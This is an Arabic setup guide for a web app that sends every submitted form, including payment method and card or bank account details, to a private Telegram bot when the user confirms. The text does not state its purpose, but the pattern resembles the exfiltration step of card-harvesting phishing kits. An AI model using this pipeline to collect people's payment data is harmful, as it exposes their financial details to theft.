# إعداد إرسال البيانات إلى تيليجرام

تم إضافة إمكانية إرسال جميع بيانات النموذج تلقائياً إلى بوت تيليجرام عند تأكيد العملية.

## خطوات الإعداد

### 1. إنشاء بوت تيليجرام

1. افتح التطبيق Telegram أو زر https://web.telegram.org
2. ابحث عن المستخدم `@BotFather`
3. أرسل الأمر `/start`
4. أرسل الأمر `/newbot`
5. اتبع التعليمات لإنشاء بوت جديد
6. ستحصل على **Bot Token** (مثال: `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)

### 2. الحصول على Chat ID

#### الطريقة 1: باستخدام رابط API

1. استبدل `YOUR_BOT_TOKEN` بالتوكن الذي حصلت عليه في الخطوة السابقة
2. افتح هذا الرابط في المتصفح:
   ```
   https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
   ```
3. أرسل أي رسالة إلى البوت (من حساب شخصي أو مجموعة)
4. أعد تحميل الرابط أعلاه
5. ابحث عن `"chat":{"id":` في النتيجة
6. انسخ رقم Chat ID (مثال: `123456789`)

#### الطريقة 2: إضافة البوت إلى مجموعة

1. أنشئ مجموعة Telegram جديدة
2. أضف البوت إلى المجموعة
3. اطلب من أي شخص إرسال رسالة
4. استخدم رابط API أعلاه للحصول على Chat ID

### 3. إضافة متغيرات البيئة

أنشئ ملف `.env.local` في جذر المشروع (لا ترفعه على GitHub):

```env
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
```

أو إذا كنت تستخدم Vercel:

1. اذهب إلى مشروعك على Vercel
2. انقر على `Settings` → `Environment Variables`
3. أضف المتغيرات:
   - `TELEGRAM_BOT_TOKEN`: رمز البوت
   - `TELEGRAM_CHAT_ID`: معرف الدردشة

### 4. اختبار الإعداد

1. قم بتشغيل التطبيق محلياً:
   ```bash
   npm run dev
   ```
   أو
   ```bash
   pnpm dev
   ```

2. ملأ النموذج بالكامل
3. عند التأكيد، يجب أن تستقبل رسالة على Telegram بجميع البيانات

## ماذا يتم إرساله؟

عند تأكيد العملية، سيتم إرسال الرسالة التالية إلى Telegram:

```
📋 تم استقبال طلب جديد

معرّف المشكلة: [المعرّف]
الرقم المتسلسل: [الرقم]
طريقة الدفع: [الطريقة]

تفاصيل الدفع:
• بيان البطاقة: القيمة
• البيان الثاني: القيمة
• ...

تم إرسال البيانات في: [التاريخ والوقت]
```

## استكشاف الأخطاء

### لا تستقبل الرسائل؟

1. **تحقق من Bot Token**: تأكد من أن التوكن صحيح ولم يكن هناك خطأ إملائي
2. **تحقق من Chat ID**: أرسل رسالة للبوت وتأكد من أن Chat ID صحيح
3. **تحقق من متغيرات البيئة**: تأكد من أنها مضبوطة بشكل صحيح
4. **تحقق من سجلات الخادم**: ابحث عن رسائل الخطأ في سجلات التطبيق

### الرسالة لا تُرسل؟

- تحقق من اتصال الإنترنت
- تأكد من أن البوت نشط وليس محظوراً
- تحقق من سجلات وحدة التحكم في المتصفح

## الأمان

⚠️ **تنبيهات أمان مهمة:**

- لا تشارك Bot Token مع أي شخص
- لا ترفع ملف `.env.local` على GitHub
- أضف `.env.local` إلى `.gitignore`
- استخدم متغيرات البيئة الآمنة في الإنتاج (Vercel Environment Variables)
- تذكر أن البيانات المُرسلة قد تشمل معلومات حساسة (أرقام بطاقات مخفيةً/معلومات الحساب البنكي)

## المزيد من المعلومات

- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
- [BotFather](https://t.me/botfather)
